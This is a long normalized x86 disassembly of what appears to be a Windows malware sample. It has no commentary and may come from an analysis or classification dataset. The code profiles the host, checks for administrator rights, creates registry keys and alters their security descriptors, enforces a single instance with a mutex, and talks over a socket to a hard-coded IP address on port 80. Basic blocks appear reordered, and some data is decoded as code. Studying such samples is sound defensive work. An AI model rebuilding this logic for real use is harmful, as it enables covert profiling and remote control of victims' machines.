call [ GetVolumeInformationW@IAT ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
push 0x6
call GetComputerObjectNameW
test al al
je r-xdata
push 0x10
xor eax eax
mov edi r--data
cmp eax edi
pop ebx
mov [ ebp - 0x1c ] ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
call [ IIDFromString@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ UuidCreate@IAT ]
push 0xffffffff
call sub_4022cc
movzx eax ax
xor [ ebp - 0x10 ] eax
push 0xffff
call sub_4022cc
or eax [ ebp - 0x10 ]
xor [ ebp - 0xa ] 0x1234
xor [ ebp - 0xc ] ax
mov esi 0xff
push esi
call sub_4022cc
xor [ ebp - 0x8 ] al
push esi
call sub_4022cc
add al 0x64
xor [ ebp - 0x7 ] al
push esi
call sub_4022cc
sub al 0x11
xor [ ebp - 0x6 ] al
push esi
call sub_4022cc
mov cl 0x22
imul cl
xor [ ebp - 0x5 ] al
push esi
call sub_4022cc
add al 0x1d
xor [ ebp - 0x4 ] al
push esi
call sub_4022cc
sub al 0x61
xor [ ebp - 0x3 ] al
push esi
call sub_4022cc
mov cl 0x15
imul cl
xor [ ebp - 0x2 ] al
push esi
call sub_4022cc
add al 0xb
xor [ ebp - 0x1 ] al
push 0x4
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40b1d0
add esp 0xc
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_401177
xor eax [ ebp - 0x10 ]
xor ecx ecx
xor ecx [ ebp - 0xc ]
mov [ rw-data ] eax
xor eax eax
cmp eax edi
mov [ rw-data ] ecx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_40426d
test al al
je r-xdata
push esi
lea eax [ ebp - 0x120 ]
push eax
call sub_401177
xor eax [ ebp - 0x120 ]
xor ecx ecx
xor ecx [ ebp - 0x11c ]
jmp r-xdata
push 0x4
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40b1d0
add esp 0xc
push 0x10
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
push 0x3
push r--data
push edi
push 0x80000001
call sub_404330
push ebx
mov [ rw-data ] eax
mov [ rw-data ] ecx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_401177
xor eax [ ebp - 0x10 ]
xor ecx ecx
xor ecx [ ebp - 0xc ]
sub_4035bd
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
mov edi [ esp + 0x10 ]
lea eax [ edi + 0x24 ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
xor al al
mov eax [ edi + 0x8 ]
mov [ esi ] eax
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_4035e6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
mov eax 0x2258
call sub_410dd0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] bl
mov [ ebp - 0x2f ] bl
mov [ ebp - 0x2e ] bl
mov [ ebp - 0x2d ] bl
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x2b ] 0x5
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x50 ] 0x104
mov [ ebp - 0x54 ] 0x100
cmp [ edi + 0x4b69 ] 0xffffffff
jne r-xdata
mov eax [ edi + 0x4b69 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ecx 0x200
mov esi rw-data
mov eax esi
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov [ edi + 0x4b69 ] ebx
call sub_403f04
cmp eax 0x2
je r-xdata
mov [ ebp - 0x34 ] 0x100
lea eax [ ebp - 0x34 ]
push eax
push esi
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
call sub_403f04
cmp eax 0x3
je r-xdata
call sub_403f04
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push 0x5
push 0xffffffff
push ebx
call WTSQuerySessionInformationW
test eax eax
je r-xdata
call sub_403f04
cmp eax 0x5
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0x30 ]
push eax
mov esi [ AllocateAndInitializeSid@IAT ]
call esi
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] r--data
lea eax [ ebp - 0x4c ]
push eax
push sub_4035bd
call sub_402a67
cmp [ ebp - 0x4c ] ebx
je r-xdata
push [ ebp - 0x34 ]
push [ ebp - 0x38 ]
push esi
call sub_40b1d0
add esp 0xc
push [ ebp - 0x38 ]
call WTSFreeMemory
lea eax [ ebp - 0x58 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x223
push 0x20
push 0x2
lea eax [ ebp - 0x30 ]
push eax
call esi
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x4c ]
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x3c ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x222
push 0x20
push 0x2
lea eax [ ebp - 0x30 ]
push eax
call esi
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_40382c
lea ecx [ ebp - 0x28 ]
push ecx
push 0x8
push eax
call [ OpenProcessToken@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x44 ]
push ebx
mov esi [ CheckTokenMembership@IAT ]
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x28 ]
mov esi [ GetTokenInformation@IAT ]
call esi
cmp [ ebp - 0x20 ] ebx
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x40 ]
push ebx
call esi
test eax eax
je r-xdata
mov [ edi + 0x4b69 ] 0x28
jmp r-xdata
mov eax 0x2000
cmp [ ebp - 0x20 ] eax
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x40 ]
push ebx
call esi
neg eax
sbb eax eax
and eax 0xa
add eax 0x14
mov [ edi + 0x4b69 ] eax
mov [ edi + 0x4b69 ] 0xa
jmp r-xdata
push [ ebp - 0x44 ]
mov esi [ FreeSid@IAT ]
call esi
push [ ebp - 0x58 ]
call esi
push [ ebp - 0x40 ]
call esi
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x20 ]
lea eax [ ebp - 0x226c ]
push eax
push 0x1
push [ ebp - 0x28 ]
call esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x26c ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push rw-data
push [ ebp - 0x226c ]
push ebx
call [ LookupAccountSidW@IAT ]
sub_4038a9
push esi
mov esi [ HeapCreate@IAT ]
push edi
push 0x0
mov edi 0x1000
push edi
push 0x0
call esi
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov al 0x1
push eax
push edi
push eax
call esi
test eax eax
mov [ rw-data ] eax
jne r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
retn
sub_4038dd
push esi
mov esi eax
cmp esi 0x6400000
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
pop esi
retn
add esi 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc esi
push 0x0
call [ SetLastError@IAT ]
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
pop esi
retn
call sub_4038a9
test al al
je r-xdata
sub_40391f
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ esp + 0x4 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
call sub_4038a9
test al al
je r-xdata
sub_4039b5
push ebp
mov ebp esp
mov ecx [ esi + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
lea eax [ eax + edx + 0x2000 ]
cdq
and edx 0xf
add eax edx
mov edi eax
sar edi 0x4
inc edi
shl edi 0x4
mov edi 0x2000
jmp r-xdata
mov eax [ esi + 0x4 ]
add eax [ ebp + 0x8 ]
cmp ecx eax
jg r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jg r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] ebx
jne r-xdata
pop edi
pop ebx
pop ebp
retn 0x8
mov al 0x1
mov eax [ ebp + 0x8 ]
add [ esi + 0x4 ] eax
call sub_402a24
cmp edi ebx
jl r-xdata
call sub_402a24
cmp edi ebx
jl r-xdata
test ebx ebx
je r-xdata
mov eax edi
call sub_4038dd
mov ebx eax
xor eax eax
mov eax edi
call sub_4038dd
jmp r-xdata
push [ esi + 0x4 ]
push [ esi ]
push ebx
call sub_40ab70
add esp 0xc
call sub_402a24
push [ esi ]
call sub_40391f
mov [ esi ] ebx
mov [ esi + 0x8 ] edi
mov [ esi + 0x8 ] ebx
jmp r-xdata
cmp eax ebx
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
jne r-xdata
sub_403a68
push esi
mov esi eax
xor eax eax
cmp [ esi ] eax
je r-xdata
xor al al
cmp [ esp + 0x8 ] eax
je r-xdata
cmp edi eax
jl r-xdata
push eax
push edi
call sub_4039b5
test al al
je r-xdata
mov eax [ esi + 0x4 ]
add eax [ esi ]
push edi
push [ esp + 0xc ]
push eax
call sub_40b1d0
add esp 0xc
add [ esi + 0x4 ] edi
mov al 0x1
jmp r-xdata
pop esi
retn 0x4
sub_403aa6
test eax eax
push edi
je r-xdata
xor eax eax
add eax 0xffffd8ec
cmp eax 0x59
ja r-xdata
push 0xfffffffd
jmp r-xdata
movzx eax [ eax + lookup_table_403af6 ]
jmp [ eax * 4 + jump_table_403ae6 ]
pop edi
push esi
mov esi [ esp + 0xc ]
call sub_403d42
mov eax edi
pop esi
jmp r-xdata
push 0xfffffffe
or eax 0xffffffff
jmp r-xdata
pop edi
retn 0x4
sub_403afa
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add [ ebx ] al
add [ ebx ] eax
add al [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add [ ecx ] eax
add [ eax ] eax
add eax [ ecx ]
add [ ebx ] eax
add [ ebx ] eax
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
jmp sub_403d42
sub_403b55
push ebp
mov ebp esp
sub esp 0x338
cmp [ ebx + 0x9 ] 0x0
push esi
push edi
je r-xdata
push 0x10
pop ecx
lea eax [ ebp - 0x14 ]
xor al al
jmp r-xdata
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push 0x50
mov [ ebp - 0x14 ] 0x2
call [ htons@IAT ]
push 0x52923316
mov [ ebp - 0x12 ] ax
call [ htonl@IAT ]
mov [ ebp - 0x10 ] eax
movsx eax [ ebp - 0x14 ]
push 0x0
xor edi edi
inc edi
push edi
push eax
call [ socket@IAT ]
mov esi eax
test esi esi
mov [ ebx ] esi
jl r-xdata
pop edi
pop esi
leave
retn
mov al [ ebx + 0x8 ]
xor ecx ecx
test al al
sete cl
lea eax [ ebp - 0x4 ]
push eax
push 0x8004667e
push esi
mov [ ebp - 0x4 ] ecx
call [ ioctlsocket@IAT ]
push 0x0
call [ WSASetLastError@IAT ]
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push [ ebx ]
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov [ ebx + 0x9 ] 0x1
mov al 0x1
call [ WSAGetLastError@IAT ]
cmp eax 0x2743
jg r-xdata
cmp eax 0x2747
je r-xdata
cmp eax 0x273f
jge r-xdata
mov esi ebx
call sub_403d42
jmp r-xdata
cmp eax 0x274b
jle r-xdata
cmp eax 0x2714
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp eax 0x274d
jle r-xdata
cmp eax 0x271c
jle r-xdata
mov eax [ ebx ]
push 0x41
mov [ ebp - 0x128 ] edi
pop ecx
mov [ ebp - 0x124 ] eax
lea esi [ ebp - 0x128 ]
lea edi [ ebp - 0x230 ]
[ edi ] [ esi ]
push 0x41
pop ecx
lea esi [ ebp - 0x128 ]
lea edi [ ebp - 0x338 ]
[ edi ] [ esi ]
cmp eax 0x276d
cmp eax 0x271e
jle r-xdata
je r-xdata
mov edi [ WSAGetLastError@IAT ]
call edi
cmp eax 0x2714
je r-xdata
cmp eax 0x2726
je r-xdata
push 0x0
call [ WSASetLastError@IAT ]
and [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x338 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
mov eax [ ebx ]
inc eax
push eax
mov [ ebp - 0x18 ] 0x186a0
call [ select@IAT ]
mov esi eax
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor esi esi
call edi
cmp eax 0x2734
jne r-xdata
cmp eax 0x2736
jmp r-xdata
lea eax [ ebp - 0x128 ]
push eax
push [ ebx ]
call __WSAFDIsSet
test eax eax
jne r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x338 ]
push eax
push [ ebx ]
call __WSAFDIsSet
test eax eax
je r-xdata
lea eax [ ebp - 0x230 ]
push eax
push [ ebx ]
call __WSAFDIsSet
test eax eax
je r-xdata
sub_403d61
cmp [ esp + 0x4 ] 0x0
push esi
push edi
mov esi eax
je r-xdata
xor eax eax
cmp [ esi + 0x9 ] 0x0
je r-xdata
push 0x0
call [ WSASetLastError@IAT ]
push 0x0
push 0x1
push [ esp + 0x14 ]
push [ esi ]
call [ recv@IAT ]
mov edi eax
call [ WSAGetLastError@IAT ]
test edi edi
jne r-xdata
jge r-xdata
call sub_403d42
mov eax edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
retn 0x4
push esi
call sub_403aa6
jmp r-xdata
sub_403db4
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x9 ] bl
je r-xdata
push edi
xor edi edi
inc edi
sub edi esi
jne r-xdata
inc esi
lea eax [ edi + esi - 0x1 ]
xor ebx ebx
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov eax esi
sub eax [ ebp + 0xc ]
mov [ esi ] 0x0
pop edi
jmp r-xdata
push 0x1
push 0x64
call [ SleepEx@IAT ]
add ebx 0x64
cmp ebx 0x4e20
jg r-xdata
cmp [ esi - 0x1 ] 0xa
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x9 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push esi
call sub_403d61
test eax eax
jle r-xdata
sub_403e29
push ebp
mov ebp esp
push ecx
push ecx
test ecx ecx
push ebx
push esi
mov esi eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
test ebx ebx
jbe r-xdata
mov al [ esi + 0x9 ]
test al al
je r-xdata
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] ecx
push edi
mov eax [ ebp + 0x8 ]
sub eax ebx
pop edi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
leave
retn 0x4
xor eax eax
test ebx ebx
jbe r-xdata
jne r-xdata
add [ ebp - 0x4 ] eax
sub ebx eax
jmp r-xdata
test al al
je r-xdata
push 0x1
push 0x64
call [ SleepEx@IAT ]
add [ ebp - 0x8 ] 0x64
cmp [ ebp - 0x8 ] 0x4e20
jg r-xdata
mov al [ esi + 0x9 ]
test al al
jne r-xdata
push 0x0
call [ WSASetLastError@IAT ]
push 0x0
push ebx
push [ ebp - 0x4 ]
push [ esi ]
call [ send@IAT ]
mov edi eax
call [ WSAGetLastError@IAT ]
test edi edi
jne r-xdata
test ebx ebx
jle r-xdata
jge r-xdata
call sub_403d42
mov eax edi
jmp r-xdata
test eax eax
je r-xdata
test eax eax
jle r-xdata
push esi
call sub_403aa6
jmp r-xdata
sub_403ee0
mov eax [ esp + 0x4 ]
push r--data
add eax 0x24
push eax
call sub_4023b7
test al al
je r-xdata
xor al al
retn
mov eax [ esp + 0x8 ]
mov [ eax + 0x4 ] 0x1
mov al 0x1
retn
sub_403f04
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x350
cmp [ edi + 0x4b65 ] 0xffffffff
push ebx
push esi
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x4b65 ]
lea eax [ esp + 0x10 ]
push eax
xor esi esi
push sub_403ee0
mov [ edi + 0x4b65 ] esi
call sub_402a67
mov ebx 0x104
push ebx
lea eax [ esp + 0x154 ]
push eax
mov [ esp + 0x13 ] 0x0
call [ FindFirstVolumeW@IAT ]
xor ecx ecx
cmp eax 0xffffffff
mov [ esp + 0xc ] eax
mov [ esp + 0x24 ] ecx
je r-xdata
mov eax [ esp + 0x24 ]
and esi 0xfff00000
cmp eax 0x4
ja r-xdata
jmp r-xdata
cmp [ esp + 0x14 ] 0x0
jne r-xdata
jb r-xdata
push ecx
lea eax [ esp + 0x1c ]
push eax
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x15c ]
push eax
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] ecx
call [ GetDiskFreeSpaceExW@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] ecx
mov [ esp + 0xc ] ebx
mov esi rw-data
jne r-xdata
cmp [ esp + 0xb ] 0x0
jne r-xdata
mov [ esp + 0xb ] 0x1
cmp esi ecx
jae r-xdata
push ebx
lea eax [ esp + 0x154 ]
push eax
push [ esp + 0x14 ]
call [ FindNextVolumeW@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
add esi eax
mov eax [ esp + 0x1c ]
adc [ esp + 0x24 ] eax
push r--data
push esi
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
call [ GetComputerNameW@IAT ]
test eax eax
jne r-xdata
mov ecx 0x11c
mov edx ecx
lea eax [ esp + 0x30 ]
xor ecx ecx
push [ esp + 0xc ]
call [ FindVolumeClose@IAT ]
xor ecx ecx
mov [ edi + 0x4b65 ] 0x309
push r--data
push esi
call [ lstrcpyW@IAT ]
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov esi [ GetVersionExW@IAT ]
lea eax [ esp + 0x30 ]
push eax
mov [ esp + 0x34 ] ecx
call esi
test eax eax
jne r-xdata
xor ecx ecx
inc ecx
cmp [ esp + 0x40 ] ecx
jbe r-xdata
lea eax [ esp + 0x30 ]
push eax
mov [ esp + 0x34 ] 0x114
call esi
test eax eax
jne r-xdata
and [ edi + 0x4b65 ] 0x0
jmp r-xdata
push 0x2
pop eax
cmp [ esp + 0x40 ] eax
jne r-xdata
and [ edi + 0x4b65 ] eax
jmp r-xdata
cmp [ esp + 0x34 ] 0x6
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esp + 0x34 ] 0x5
jne r-xdata
cmp [ esp + 0x38 ] ecx
jne r-xdata
cmp [ esp + 0x38 ] eax
jne r-xdata
cmp [ esp + 0x38 ] 0x0
jne r-xdata
mov [ edi + 0x4b65 ] 0x5
jmp r-xdata
cmp [ esp + 0x38 ] ecx
je r-xdata
mov [ edi + 0x4b65 ] eax
jmp r-xdata
mov [ edi + 0x4b65 ] 0x3
jmp r-xdata
cmp [ esp + 0x38 ] 0x0
jne r-xdata
mov [ edi + 0x4b65 ] ecx
jmp r-xdata
sub_404109
push ebp
mov ebp esp
push ecx
push ebx
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
xor ebx ebx
push 0x8
mov [ ebp - 0x4 ] ebx
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
test eax eax
mov edi [ GetLastError@IAT ]
jne r-xdata
push esi
push [ esi ]
push [ ebp + 0x8 ]
push 0x1
push [ ebp - 0x4 ]
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
call edi
cmp eax 0x3f0
je r-xdata
mov bl 0x1
jmp r-xdata
call edi
cmp eax 0x7a
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
xor al al
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov al bl
jmp r-xdata
pop edi
pop ebx
leave
retn 0x4
sub_404188
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
xor ebx ebx
push ebx
lea esi [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
call sub_404109
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax ebx
jl r-xdata
xor al al
jmp r-xdata
push ebx
lea esi [ ebp - 0x4 ]
call sub_404109
test al al
je r-xdata
call sub_4038dd
mov ebx eax
pop esi
pop ebx
leave
retn 0x4
push edi
push [ ebx ]
call [ GetLengthSid@IAT ]
mov edi eax
add edi 0x10
js r-xdata
xor esi esi
mov eax edi
call sub_4038dd
mov esi eax
jmp r-xdata
push ebx
call sub_40391f
xor al al
push 0x2
push edi
push esi
call [ InitializeAcl@IAT ]
test eax eax
je r-xdata
test esi esi
je r-xdata
push esi
call sub_40391f
push [ ebx ]
push 0xf0000
push 0x2
push esi
call [ AddAccessAllowedAce@IAT ]
test eax eax
je r-xdata
push 0x1
lea eax [ ebp - 0x18 ]
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
push 0x0
push esi
push 0x1
lea eax [ ebp - 0x18 ]
push eax
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call [ RegSetKeySecurity@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0xb ] 0x1
jmp r-xdata
mov [ ebp + 0xb ] 0x0
push esi
call sub_40391f
push ebx
call sub_40391f
mov al [ ebp + 0xb ]
jmp r-xdata
pop edi
sub_40426d
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
xor edi edi
xor eax eax
mov esi r--data
cmp eax esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0xc ] 0x3
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push edi
push [ ebp + 0x8 ]
push 0x80000001
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
push ebx
mov ebx [ RegQueryValueExW@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push edi
lea eax [ ebp - 0xc ]
push eax
push edi
push esi
push [ ebp - 0x4 ]
call ebx
test eax eax
je r-xdata
pop edi
pop esi
leave
retn 0xc
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] eax
jb r-xdata
push [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
mov [ ecx ] eax
call [ RegCloseKey@IAT ]
cmp [ ebp + 0xc ] edi
sete al
cmp [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
call [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
push edi
push esi
push [ ebp - 0x4 ]
call ebx
test eax eax
push [ ebp - 0x4 ]
je r-xdata
pop ebx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
call [ RegCloseKey@IAT ]
mov al 0x1
jmp r-xdata
sub_404330
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp + 0xc ]
push eax
xor esi esi
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x20006
push esi
push esi
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] esi
je r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x4 ]
cmp [ ebp + 0x1c ] esi
je r-xdata
pop esi
leave
retn 0x18
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call [ RegSetValueExW@IAT ]
test eax eax
push [ ebp - 0x4 ]
je r-xdata
call [ RegCloseKey@IAT ]
mov al 0x1
call [ RegCloseKey@IAT ]
jmp r-xdata
sub_40439e
push ebp
mov ebp esp
sub esp 0x41c
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] edi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push edx
call [ RegOpenKeyW@IAT ]
test eax eax
jne r-xdata
xor al al
jmp r-xdata
push ebx
push [ ebp - 0x4 ]
call sub_404188
push [ ebp + 0x8 ]
mov ebx [ RegDeleteKeyW@IAT ]
push [ ebp - 0x8 ]
call ebx
test eax eax
jne r-xdata
pop edi
leave
retn 0x8
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x1c ]
push eax
push edi
push edi
lea eax [ ebp - 0x10 ]
push eax
push edi
push edi
push edi
push [ ebp - 0x4 ]
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
pop ebx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0xc ] edi
jbe r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call ebx
neg eax
sbb al al
inc al
push esi
mov esi [ lstrcatW@IAT ]
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x21c ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x21c ]
push eax
call esi
lea eax [ ebp - 0x41c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call esi
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x18 ]
push edi
lea eax [ ebp - 0x21c ]
push eax
call sub_40439e
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x41c ]
push eax
push edi
push [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0xff
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
pop esi
sub_4044bc
push ecx
push ebx
push ebp
mov ebp [ CloseHandle@IAT ]
push esi
mov esi [ GetLastError@IAT ]
xor ebx ebx
push edi
mov [ esp + 0x10 ] ebx
mov edi r--data
push edi
push ebx
push ebx
call [ CreateMutexW@IAT ]
mov [ rw-data ] eax
call esi
cmp eax 0xb7
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x5
je r-xdata
inc [ esp + 0x10 ]
cmp [ esp + 0x10 ] 0x3
jg r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
xor al al
push eax
call ebp
push 0x1b58
call [ Sleep@IAT ]
jmp r-xdata
push eax
call ebp
mov al 0x1
jmp r-xdata
push ebx
call [ SetLastError@IAT ]
push edi
push ebx
push 0x1f0001
call [ OpenMutexW@IAT ]
mov [ rw-data ] eax
call esi
cmp eax 0x2
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_40455d
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x218
lea eax [ esp ]
push eax
lea eax [ esp + 0x1c ]
push eax
